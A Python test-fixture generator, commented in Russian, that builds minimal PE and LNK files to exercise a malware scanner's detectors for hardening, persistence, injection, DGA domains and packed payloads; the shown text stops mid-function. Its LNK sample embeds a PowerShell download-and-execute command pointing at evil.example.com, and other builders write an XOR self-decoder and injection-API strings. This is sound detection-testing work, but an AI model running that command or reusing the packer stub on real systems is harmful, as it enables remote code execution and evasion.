# tests/artifact_factory.py
# Генератор тестовых PE-артефактов для QA: Hardening, Masquerading, Persistence, Ordinal, Sneaky.
# v1.1: Evasion engines (obfuscate_payload, wrap_in_unpacker), Rust/Go/PyInstaller/ packed T1055.

from __future__ import annotations
import os
import struct
import shutil
import sys
from pathlib import Path
from typing import Dict, Any, Optional, List

# FileAlignment для PE секций (cwe_checker и др. требуют SizeOfRawData <= фактический размер в файле)
FILE_ALIGNMENT = 0x200


def _align(size: int, alignment: int) -> int:
    """Округляет size вверх до кратного alignment (степень двойки). Гарантирует совпадение SizeOfRawData с длиной данных в файле."""
    if alignment <= 0:
        return size
    return (size + alignment - 1) & ~(alignment - 1)


# ---------------------------------------------------------------------------
# Evasion engines (Artifact Factory v1.1)
# Legacy: wrap_in_unpacker и build_* на базе _minimal_pe_base формируют PE с оверлеем (имитация).
# Они сохранены для обратной совместимости и для достижения 250+ артефактов при отсутствии компилятора.
# При наличии gcc/mingw Payload-as-Code перезаписывает/дополняет артефакты реальными C-шаблонами.
# ---------------------------------------------------------------------------

def obfuscate_payload(data: bytes, method: str = "xor", key: Optional[int] = None) -> bytes:
    """Возвращает закодированные данные. method='xor' — однобайтовый XOR (по умолчанию ключ 0x41)."""
    if not data:
        return data
    if method == "xor":
        k = key if key is not None else 0x41
        return bytes(b ^ k for b in data)
    return data


def wrap_in_unpacker(
    payload: bytes,
    lang: str = "cpp",
    xor_key: Optional[int] = 0x41,
) -> bytes:
    """
    Создаёт минимальный исполняемый файл с payload в оверлее или в секции .rdata (XOR).
    lang='cpp': PE с двумя секциями: .text (stub-декодер), .rdata (XOR-нагрузка).
    После загрузки entry point выполняет XOR-декодирование .rdata на месте; Deep Memory Scan видит расшифрованное.
    """
    key = xor_key if xor_key is not None else 0x41
    encoded = obfuscate_payload(payload, method="xor", key=key)
    # Формат .rdata: [1 byte key][2 bytes length LE][xor payload]
    len_payload = len(encoded)
    if len_payload > 0xFFFF:
        len_payload = 0xFFFF
        encoded = encoded[:0xFFFF]
    rdata_content = bytes([key]) + struct.pack("<H", len_payload) + encoded
    # Декодер x86: base .rdata = 0x402000, декодирует in-place с 3-го байта
    # B8 00 20 40 00 = mov eax, 0x402000
    # 8A 18 = mov bl, [eax]
    # 0F B7 48 01 = movzx ecx, word [eax+1]
    # 8D 78 03 = lea edi, [eax+3]
    # L: 8A 07 30 D8 88 07 47 49 75 F6 = loop xor
    # C3 = ret
    decoder = (
        b"\xB8\x00\x20\x40\x00"  # mov eax, 0x402000
        b"\x8A\x18"              # mov bl, [eax]
        b"\x0F\xB7\x48\x01"      # movzx ecx, word [eax+1]
        b"\x8D\x78\x03"          # lea edi, [eax+3]
        b"\x8A\x07"              # L: mov al, [edi]
        b"\x30\xD8"              # xor al, bl
        b"\x88\x07"              # mov [edi], al
        b"\x47"                  # inc edi
        b"\x49"                  # dec ecx
        b"\x75\xF4"              # jnz L
        b"\xC3"                  # ret
    )
    # Двухсекционный PE: .text @ 0x1000, .rdata @ 0x2000; выравнивание по FileAlignment (cwe_checker)
    rdata_raw_size = _align(len(rdata_content), FILE_ALIGNMENT)
    rdata_padded = rdata_content + b"\x00" * (rdata_raw_size - len(rdata_content))
    text_raw_size = FILE_ALIGNMENT
    text_content = decoder + b"\x00" * (text_raw_size - len(decoder))
    # Собираем PE вручную: DOS + PE + COFF + Optional (224) + 2 section headers
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", 64)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack(
        "<HHIIIHH",
        0x014C, 2, 0, 0, 0, 224, 0x103,
    )
    opt = bytearray(224)
    opt[0:2] = struct.pack("<H", 0x10B)
    opt[16:20] = struct.pack("<I", 0x1000)   # AddressOfEntryPoint
    opt[28:32] = struct.pack("<I", 0x400000)
    opt[32:36] = struct.pack("<I", 0x1000)
    opt[36:40] = struct.pack("<I", FILE_ALIGNMENT)
    opt[48:52] = struct.pack("<I", 0x4000)   # SizeOfImage
    opt[52:56] = struct.pack("<I", _align(64 + 4 + 20 + 224 + 40 + 40, FILE_ALIGNMENT))  # SizeOfHeaders
    opt[56:58] = struct.pack("<H", 2)
    opt[64:66] = struct.pack("<H", 0)        # DllCharacteristics
    # Section 1: .text — SizeOfRawData и данные ровно text_raw_size; PointerToRawData = FILE_ALIGNMENT
    sec1_name = b".text\x00\x00\x00"
    sec1_ptr = FILE_ALIGNMENT
    sec1 = struct.pack(
        "<IIIIIIHHII",
        text_raw_size, 0x1000, text_raw_size, sec1_ptr, 0, 0, 0, 0, 0, 0x60000020,
    )
    # Section 2: .rdata — SizeOfRawData = rdata_raw_size, PointerToRawData = sec1_ptr + text_raw_size
    sec2_name = b".rdata\x00\x00"
    sec2_ptr = sec1_ptr + text_raw_size
    sec2 = struct.pack(
        "<IIIIIIHHII",
        rdata_raw_size, 0x2000, rdata_raw_size, sec2_ptr, 0, 0, 0, 0, 0, 0xC0000040,
    )
    headers = bytes(dos) + pe_sig + bytes(coff) + bytes(opt) + sec1_name + sec1 + sec2_name + sec2
    pad_len = _align(len(headers), FILE_ALIGNMENT) - len(headers)
    body = b"\x00" * pad_len + text_content + rdata_padded
    return headers + body

# Минимальный валидный PE32 (Windows GUI, x86): DOS header + PE + COFF + Optional + 1 section .text
# DllCharacteristics в Optional Header (PE32) — смещение 64 от начала Optional Header.
# Размеры: DOS=64, stub до e_lfanew, e_lfanew=0x80, PE=4, COFF=20, Optional=224, Section header=40, .text raw
def _minimal_pe_base() -> bytes:
    # DOS header
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    # PE signature сразу после DOS header (64 bytes)
    dos[0x3C:0x40] = struct.pack("<I", 64)  # e_lfanew
    pe_sig = b"PE\x00\x00"
    # COFF: Machine=0x14c, NumSections=1, SizeOfOptionalHeader=224, Chars=0x103
    coff = struct.pack(
        "<HHIIIHH",
        0x014C,  # Machine
        1,       # NumberOfSections
        0,       # TimeDateStamp
        0,       # PointerToSymbolTable
        0,       # NumberOfSymbols
        224,     # SizeOfOptionalHeader
        0x103,   # Characteristics (executable, 32bit)
    )
    # Optional header PE32: Magic=0x10b, затем поля до DllCharacteristics (offset 64)
    opt = bytearray(224)
    opt[0:2] = struct.pack("<H", 0x10B)   # Magic
    opt[16:20] = struct.pack("<I", 0x1000) # AddressOfEntryPoint
    opt[28:32] = struct.pack("<I", 0x400000) # ImageBase
    opt[32:36] = struct.pack("<I", 0x1000)   # SectionAlignment
    opt[36:40] = struct.pack("<I", 0x200)   # FileAlignment
    opt[48:52] = struct.pack("<I", 0x2000)   # SizeOfImage
    opt[52:56] = struct.pack("<I", 0x200)    # SizeOfHeaders
    opt[56:58] = struct.pack("<H", 2)        # Subsystem = GUI
    # DllCharacteristics at offset 64 in optional header
    # opt[64:66] — заполнит вызывающий код
    opt[60:62] = struct.pack("<H", 0x8180)  # Stack/Heap reserve (min)
    opt[66:68] = struct.pack("<H", 0x10)    # SizeOfStackReserve (min)
    # Section header: .text, VirtualSize=0x200, SizeOfRawData=0x200, PointerToRawData=0x200
    sec_name = b".text\x00\x00\x00"
    sec = struct.pack(
        "<IIIIIIHHII",
        0x200,   # VirtualSize
        0x1000,  # VirtualAddress
        0x200,   # SizeOfRawData
        0x200,   # PointerToRawData
        0, 0, 0,  # PointerToRelocations, PointerToLinenumbers
        0, 0,    # NumRelocations, NumLinenumbers
        0x60000020,  # Characteristics (code, executable, read)
    )
    headers_len = len(dos) + len(pe_sig) + len(coff) + len(opt) + len(sec_name) + len(sec)
    pad_len = _align(headers_len, FILE_ALIGNMENT) - headers_len
    # .text content: минимальный код (ret для x86); размер секции = FILE_ALIGNMENT
    body = bytearray(pad_len) + bytearray(FILE_ALIGNMENT)
    body[pad_len : pad_len + 1] = bytes([0xC3])  # ret
    return bytes(dos) + pe_sig + bytes(coff) + bytes(opt) + sec_name + sec + bytes(body)


def _get_dllcharacteristics_offset() -> int:
    # PE at 64, +4 (sig) +20 (COFF) = 88 start of optional header; DllCharacteristics at offset 70 (pefile)
    return 64 + 4 + 20 + 70


def build_naked(out_path: Path) -> Path:
    """PE без ASLR, DEP и с минимальной/пустой таблицей импортов (нет DIR_IMPORT)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)  # DllCharacteristics = 0
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data))
    return out_path


def build_hardened(out_path: Path) -> Path:
    """PE со всеми флагами: ASLR, DEP, CFG, HighEntropyVA."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    # 0x0020 HighEntropyVA | 0x0040 DYNAMIC_BASE | 0x0100 NX_COMPAT | 0x4000 GUARD_CF
    flags = 0x0020 | 0x0040 | 0x0100 | 0x4000
    data[off : off + 2] = struct.pack("<H", flags)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data))
    return out_path


def build_masquerade(out_path: Path) -> Path:
    """PE с именем/расширением под документ (report.xlsx) — триггер мимикрии по имени."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data))
    # Сохраняем с именем под документ — детектор смотрит path.name
    doc_path = out_path.parent / "report.xlsx"
    doc_path.write_bytes(bytes(data))
    return doc_path


def build_sneaky(out_path: Path) -> Path:
    """PE с оверлеем: строки DoH-резолверов и путей реестра RunOnce."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    # Оверлей: DoH и RunOnce
    overlay = (
        b"https://cloudflare-dns.com/dns-query "
        b"https://dns.google/resolve "
        b"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce "
        b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        b"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
    )
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay)
    return out_path


def build_high_entropy(out_path: Path) -> Path:
    """PE с оверлеем из высокоэнтропийных данных (энтропия > 7.2) для проверки Entropy Trigger."""
    import os
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    # Оверлей: псевдо-случайные байты для энтропии файла/секции > 7.2
    rnd = os.urandom(4096)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + rnd)
    return out_path


# Секреты для триггера модуля поиска секретов (secrets_scan.py): AWS Key ID и Secret
_SECRETS_OVERLAY = (
    b"AKIAIOSFODNN7EXAMPLE"
    b"\x00"
    b"aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
)


def build_with_secrets(out_path: Path) -> Path:
    """PE с оверлеем, содержащим строки-имитаторы секретов (AWS Key, AWS Secret, Google API Key)."""
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _SECRETS_OVERLAY)
    return out_path


def build_cet_hardened(out_path: Path) -> Path:
    """PE с Load Config: GuardFlags включают Intel CET (IBT). Триггерит cet_ibt в pe_hardening."""
    # Собираем PE вручную с двумя секциями: .text + .rdata (Load Config в .rdata)
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", 64)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack("<HHIIIHH", 0x014C, 2, 0, 0, 0, 224, 0x103)  # 2 sections
    opt = bytearray(224)
    opt[0:2] = struct.pack("<H", 0x10B)
    opt[16:20] = struct.pack("<I", 0x1000)
    opt[28:32] = struct.pack("<I", 0x400000)
    opt[32:36] = struct.pack("<I", 0x1000)
    opt[36:40] = struct.pack("<I", 0x200)
    opt[48:52] = struct.pack("<I", 0x3000)   # SizeOfImage
    opt[52:56] = struct.pack("<I", 0x200)
    opt[56:58] = struct.pack("<H", 2)
    opt[64:66] = struct.pack("<H", 0x0020 | 0x0040 | 0x0100 | 0x4000)  # ASLR, DEP, CFG, HighEntropyVA
    opt[60:62] = struct.pack("<H", 0x8180)
    opt[66:68] = struct.pack("<H", 0x10)
    # DataDirectory[10] Load Config: RVA 0x2000, Size 0x50 (offset in opt: 96+10*8=176)
    opt[176:180] = struct.pack("<I", 0x2000)
    opt[180:184] = struct.pack("<I", 0x50)
    sec1 = b".text\x00\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0, 0x60000020
    )
    sec2 = b".rdata\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x100, 0x2000, 0x200, 0x400, 0, 0, 0, 0, 0, 0x40000040
    )
    # IMAGE_LOAD_CONFIG_DIRECTORY32: Size=0x50, GuardFlags at 0x48 = 0x40200 (CET IBT)
    load_config = bytearray(0x200)
    struct.pack_into("<I", load_config, 0x00, 0x50)
    struct.pack_into("<I", load_config, 0x48, 0x40200)
    headers_len = 64 + 4 + 20 + 224 + 40 + 40
    pad = bytes(0x200 - headers_len)
    text_body = bytes(0x200)
    text_body = bytearray(text_body)
    text_body[0] = 0xC3  # ret
    rdata_body = bytes(load_config)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(
        bytes(dos) + pe_sig + bytes(coff) + bytes(opt) + sec1 + sec2 + pad + bytes(text_body) + rdata_body
    )
    return out_path


# Сигнатура EICAR — после загрузки PE эмулятором попадёт в дамп памяти
EICAR_SIGNATURE = b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE"

# Секция с данными (не только код): для записи EICAR через pefile
IMAGE_SCN_CNT_INITIALIZED_DATA = 0x40
IMAGE_SCN_MEM_WRITE = 0x80000000


def _build_speakeasy_friendly_template(template_path: Path) -> None:
    """
    Шаблон PE с записываемой .idata (IAT), чтобы загрузчик Speakeasy мог записать адрес ExitProcess
    без UC_ERR_WRITE_UNMAPPED. Секции: .text (ret), .data (для EICAR), .idata (READ|WRITE).
    """
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", 64)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack("<HHIIIHH", 0x014C, 3, 0, 0, 0, 224, 0x103)
    opt = bytearray(224)
    opt[0:2] = struct.pack("<H", 0x10B)
    opt[16:20] = struct.pack("<I", 0x1000)
    opt[28:32] = struct.pack("<I", 0x400000)
    opt[32:36] = struct.pack("<I", 0x1000)
    opt[36:40] = struct.pack("<I", 0x200)
    opt[48:52] = struct.pack("<I", 0x4000)
    opt[52:56] = struct.pack("<I", 0x200)
    opt[56:58] = struct.pack("<H", 3)
    opt[64:66] = struct.pack("<H", 0x0020 | 0x0040 | 0x0100 | 0x4000)
    opt[60:62] = struct.pack("<H", 0x8180)
    opt[66:68] = struct.pack("<H", 0x10)
    opt[104:108] = struct.pack("<I", 0x3000)
    opt[108:112] = struct.pack("<I", 0)

    sec1 = b".text\x00\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0, 0x60000020
    )
    sec2 = b".data\x00\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x200, 0x2000, 0x200, 0x400, 0, 0, 0, 0, 0, 0x40000040 | IMAGE_SCN_MEM_WRITE
    )
    sec3 = b".idata\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x200, 0x3000, 0x200, 0x600, 0, 0, 0, 0, 0, 0x40000040 | IMAGE_SCN_MEM_WRITE
    )
    headers_len = 64 + 4 + 20 + 224 + 40 * 3
    pad = bytes(0x200 - headers_len)
    text_body = bytearray(0x200)
    text_body[0] = 0xC3
    data_body = bytearray(0x200)
    idata_body = bytearray(0x200)
    idata_body[0:4] = struct.pack("<I", 0x3010)
    idata_body[4:8] = struct.pack("<I", 0)
    idata_body[8:12] = struct.pack("<I", 0)
    idata_body[12:16] = struct.pack("<I", 0)
    idata_body[16:20] = struct.pack("<I", 0x3020)
    idata_body[20:24] = struct.pack("<I", 0x3030)
    idata_body[0x10:0x14] = struct.pack("<I", 0x3040)
    idata_body[0x14:0x18] = struct.pack("<I", 0)
    idata_body[0x20:0x20 + 12] = b"kernel32.dll\x00"
    idata_body[0x40:0x42] = struct.pack("<H", 0)
    idata_body[0x42:0x42 + 12] = b"ExitProcess\x00"

    template_path.parent.mkdir(parents=True, exist_ok=True)
    template_path.write_bytes(
        bytes(dos) + pe_sig + bytes(coff) + bytes(opt) + sec1 + sec2 + sec3 + pad
        + bytes(text_body) + bytes(data_body) + bytes(idata_body)
    )


def build_emulation_payload(out_path: Path) -> Path:
    """
    Стратегия эталонного артефакта: открываем существующий минимальный PE (samples/checksec_sample.exe
    или шаблон emulation_template.exe), находим первую секцию с данными и записываем туда EICAR через pefile.
    Цепочка: Бинарник -> Эмуляция -> Дамп -> YARA -> Отчёт.
    """
    out_path = Path(out_path)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    try:
        import pefile
    except ImportError:
        # Fallback без pefile: минимальный PE с EICAR в .text
        _build_emulation_payload_fallback(out_path)
        return out_path

    repo_root = Path(__file__).resolve().parent.parent
    template_path = repo_root / "samples" / "checksec_sample.exe"
    if not template_path.exists():
        template_path = out_path.parent / "emulation_template.exe"
        if not template_path.exists():
            _build_speakeasy_friendly_template(template_path)

    try:
        pe = pefile.PE(str(template_path))
    except Exception:
        _build_emulation_payload_fallback(out_path)
        return out_path

    try:
        data_section = None
        for section in pe.sections:
            name = (getattr(section, "Name", b"") or b"").decode("utf-8", errors="ignore").strip("\x00")
            if name in (".rdata", ".data", ".rsrc") or (section.Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA):
                if section.SizeOfRawData >= len(EICAR_SIGNATURE):
                    data_section = section
                    break
        if data_section is None:
            _build_emulation_payload_fallback(out_path)
            pe.close()
            return out_path

        raw_offset = data_section.PointerToRawData
        pe.close()
        pe = None
        # Инъекция через перезапись байтов в файле (pefile.write не всегда сохраняет set_bytes_at_rva)
        data = bytearray(template_path.read_bytes())
        if raw_offset + len(EICAR_SIGNATURE) <= len(data):
            data[raw_offset : raw_offset + len(EICAR_SIGNATURE)] = EICAR_SIGNATURE
        out_path.write_bytes(bytes(data))
    finally:
        if pe is not None:
            pe.close()

    return out_path


def _build_emulation_payload_fallback(out_path: Path) -> None:
    """Минимальный PE с EICAR в .text, если pefile или эталон недоступны."""
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", 64)
    pe_sig = b"PE\x00\x00"
    coff = struct.pack("<HHIIIHH", 0x014C, 1, 0, 0, 0, 224, 0x103)
    opt = bytearray(224)
    opt[0:2] = struct.pack("<H", 0x10B)
    opt[16:20] = struct.pack("<I", 0x1000)
    opt[28:32] = struct.pack("<I", 0x400000)
    opt[32:36] = struct.pack("<I", 0x1000)
    opt[36:40] = struct.pack("<I", 0x200)
    opt[48:52] = struct.pack("<I", 0x2000)
    opt[52:56] = struct.pack("<I", 0x200)
    opt[56:58] = struct.pack("<H", 3)
    opt[64:66] = struct.pack("<H", 0x0020 | 0x0040 | 0x0100 | 0x4000)
    opt[60:62] = struct.pack("<H", 0x8180)
    opt[66:68] = struct.pack("<H", 0x10)
    sec1 = b".text\x00\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0, 0x60000020
    )
    headers_len = 64 + 4 + 20 + 224 + 40
    pad = bytes(0x200 - headers_len)
    text_body = bytearray(0x200)
    text_body[0] = 0xC3
    text_body[2 : 2 + len(EICAR_SIGNATURE)] = EICAR_SIGNATURE
    out_path.write_bytes(bytes(dos) + pe_sig + bytes(coff) + bytes(opt) + sec1 + pad + bytes(text_body))


def _lnk_encode_string(s: str) -> bytes:
    """Кодирует строку для LNK: 2 байта (длина в символах), затем UTF-16-LE."""
    u = s.encode("utf-16-le")
    return struct.pack("<H", len(s)) + u


def build_lnk_sample(out_path: Path) -> Path:
    """Минимально валидный .lnk с аргументами командной строки (PowerShell download) и URL для supply_chain."""
    # Shell Link Header: 76 bytes. Magic 4C 00 00 00, flags at 20
    header = bytearray(76)
    header[0:4] = b"\x4c\x00\x00\x00"  # Magic
    # Flags: has_name(0x04), has_relative_path(0x08), has_working_dir(0x10), has_arguments(0x20) = 0x3C
    header[20:24] = struct.pack("<I", 0x3C)
    # No LinkTargetIDList, no LinkInfo — сразу String Data
    payload = (
        _lnk_encode_string("Update")
        + _lnk_encode_string("C:\\Windows\\System32\\cmd.exe")
        + _lnk_encode_string("C:\\Temp")
        + _lnk_encode_string("/c powershell -c IEX(New-Object Net.WebClient).DownloadString('https://evil.example.com/payload.ps1')")
    )
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(header) + payload)
    return out_path


# IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY (HVCI)
IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY = 0x0080
# Data directory index for Base Relocation
DIR_BASERELOC = 5
IMAGE_FILE_RELOCS_STRIPPED = 0x0001


def _minimal_pe_with_reloc() -> bytes:
    """Минимальный PE32 с одной секцией .text и секцией .reloc (для HVCI: relocs_present=True)."""
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", 64)
    pe_sig = b"PE\x00\x00"
    # COFF: 2 sections, Optional 224, Characteristics без RELOCS_STRIPPED (0x102 = executable, 32bit)
    coff = struct.pack(
        "<HHIIIHH",
        0x014C, 2, 0, 0, 0, 224, 0x102,
    )
    opt = bytearray(224)
    opt[0:2] = struct.pack("<H", 0x10B)
    opt[16:20] = struct.pack("<I", 0x1000)
    opt[28:32] = struct.pack("<I", 0x400000)
    opt[32:36] = struct.pack("<I", 0x1000)
    opt[36:40] = struct.pack("<I", 0x200)
    opt[48:52] = struct.pack("<I", 0x3000)
    opt[52:56] = struct.pack("<I", 0x200)
    opt[56:58] = struct.pack("<H", 2)
    # DllCharacteristics at offset 70 in Optional Header (PE32)
    opt[70:72] = struct.pack("<H", 0x0020 | 0x0040 | 0x0100 | 0x4000 | IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY)
    opt[60:62] = struct.pack("<H", 0x8180)
    opt[66:68] = struct.pack("<H", 0x10)
    # DataDirectory[DIR_BASERELOC]: RVA 0x2000, Size 0x0C (один блок релокаций)
    opt[96 + DIR_BASERELOC * 8 : 96 + DIR_BASERELOC * 8 + 4] = struct.pack("<I", 0x2000)
    opt[96 + DIR_BASERELOC * 8 + 4 : 96 + DIR_BASERELOC * 8 + 8] = struct.pack("<I", 0x0C)
    sec1 = b".text\x00\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0, 0x60000020,
    )
    sec2 = b".reloc\x00\x00" + struct.pack(
        "<IIIIIIHHII", 0x200, 0x2000, 0x200, 0x400, 0, 0, 0, 0, 0, 0x42000040,
    )
    headers_len = 64 + 4 + 20 + 224 + 40 + 40
    pad = bytes(0x200 - headers_len)
    text_body = bytearray(0x200)
    text_body[0] = 0xC3
    # Минимальный блок релокаций: PageRVA=0x1000, BlockSize=8, одна запись IMAGE_REL_BASED_ABSOLUTE (0)
    reloc_body = bytearray(0x200)
    struct.pack_into("<I", reloc_body, 0, 0x1000)
    struct.pack_into("<I", reloc_body, 4, 8)
    struct.pack_into("<H", reloc_body, 8, 0)
    return bytes(dos) + pe_sig + bytes(coff) + bytes(opt) + sec1 + sec2 + pad + bytes(text_body) + bytes(reloc_body)


def build_hvci_compliant(out_path: Path) -> Path:
    """
    PE с флагом IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY (0x0080), корректной таблицей релокаций
    и без W^X (секция .text только RX). Для проверки pe.hardening.hvci_compatible == True.
    """
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(_minimal_pe_with_reloc())
    return out_path


# Строки, имитирующие LOLBin в метаданных/оверлее (pe_hardening ищет lb in s без .lower())
_WDAC_LOLBIN_OVERLAY = (
    b"certutil.exe\x00"
    b"mshta.exe\x00"
    b"C:\\Windows\\System32\\certutil.exe\x00"
)


def build_wdac_bypass_sample(out_path: Path) -> Path:
    """
    PE, имитирующий LOLBin: внутреннее имя CertUtil.exe/Mshta.exe в оверлее (распознаётся по all_strings).
    Дополнительно — нетипичная секция .load для эвристик кастомного загрузчика (unusual_names).
    """
    # Базовый PE с двумя секциями: .text + .load (unusual name), оверлей с LOLBin-строками
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    # Переделываем в PE с двумя секциями: нужен больший базовый шаблон
    # Упрощение: используем _minimal_pe_base() и добавляем только оверлей — детектор смотрит
    # all_strings из _ascii_strings(file_bytes) и version info. Оверлея достаточно для LOLBin.
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _WDAC_LOLBIN_OVERLAY)
    return out_path


def build_revoked_sig_mock(out_path: Path) -> Path:
    """
    Опционально: создаёт минимальный PE без реальной подписи.
    Для тестов отзыва используется мок evidence с signature.revoked=True (реальный отозванный
    сертификат в артефакте не генерируется). Файл нужен как путь для теста; сам тест подставляет
    ev["pe"]["signature"]["revoked"] = True и проверяет scoring/justification.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data))
    return out_path


# --- Risk Gradient QA: Critical / High / Medium / Low ---

# EICAR + IsDebuggerPresent для связки эмуляция + Deep Memory Scan и детекции Anti-Analysis
_EVASIVE_OVERLAY = (
    b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE\x00"
    b"IsDebuggerPresent\x00"
    b"CheckRemoteDebuggerPresent\x00"
    b"kernel32.dll\x00"
)


def build_evasive_malware(out_path: Path) -> Path:
    """
    Критический риск: PE с EICAR и строками отладочных API (IsDebuggerPresent) в оверлее.
    Проверка связки эмуляции и Deep Memory Scan (EICAR в дампе) + детекция Anti-Analysis по строкам.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _EVASIVE_OVERLAY)
    return out_path


def build_obfuscated_dropper(out_path: Path) -> Path:
    """
    Высокий риск: PE с экстремально высокой энтропией (> 7.5) в оверлее и строками
    VirtualAllocEx/WriteProcessMemory (типичный дроппер/инжектор). Нет реальной таблицы импортов —
    детекция по строкам и энтропии.
    """
    import os
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    overlay_high_entropy = os.urandom(8192)  # энтропия ~8
    overlay_strings = (
        b"VirtualAllocEx\x00"
        b"WriteProcessMemory\x00"
        b"CreateRemoteThreadEx\x00"
    )
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + overlay_high_entropy + overlay_strings)
    return out_path


# DGA-подобные домены + ключи реестра закрепления (средний риск при «подписанном» в тесте)
_SUSPICIOUS_LOGIC_OVERLAY = (
    b"xjyzqwxv.tk\x00"
    b"bqgfkmnp.ml\x00"
    b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
    b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\x00"
    b"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
)


def build_suspicious_logic(out_path: Path) -> Path:
    """
    Средний риск: строки DGA-доменов и ключи реестра автозагрузки (Run/RunOnce).
    В тесте может подаваться как «подписанный» (signature.present=True), чтобы не добавлять штраф за подпись.
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    data[off : off + 2] = struct.pack("<H", 0)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data) + _SUSPICIOUS_LOGIC_OVERLAY)
    return out_path


def build_weak_hardened(out_path: Path) -> Path:
    """
    Низкий риск: легитимный вид — ASLR и DEP включены, но нет CFG и Intel CET.
    Должен давать минимальный штраф (только за отсутствие CFG/CET в рамках hardening).
    """
    data = bytearray(_minimal_pe_base())
    off = _get_dllcharacteristics_offset()
    # 0x0040 DYNAMIC_BASE | 0x0100 NX_COMPAT — без GUARD_CF (0x4000) и без HighEntropyVA (0x0020)
    flags = 0x0040 | 0x0100
    data[off : off + 2] = struct.pack("<H", flags)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(bytes(data))
    return out_path


# --- Kill-chain / сложные цепочки (Process Hollowing, Stealer, Advanced Phishing) ---

# Process Hollowing: импорты цепочки внедрения + XOR-шеллкод в оверлее
_INJECTION_CHAIN_APIS = (
    b"CreateProcessA\x00"
    b"VirtualAllocEx\x00"
    b"WriteProcessMemory\x00"
    b"SetThreadContext\x00"
    b"ResumeThread\x00"
    b"kernel32.dll\x00"
)
_XOR_KEY = 0x41
# Минимальный «шеллкод» (nop nop int3) для оверлея, зашифрованный XOR
_SHELLCODE_PLAIN = bytes([0x90, 0x90, 0xCC, 0xC3])  # nop nop int3 ret
_SHELLCODE_XOR = bytes(b ^ _XOR_KEY for b in _SHELLCODE_PLAIN)


def build_injection_chain_sample(out_path: Path) -> Path:
    """
    PE, имитирующий цепочку внедрения кода (Process Hollowing): импорты CreateProcessA,
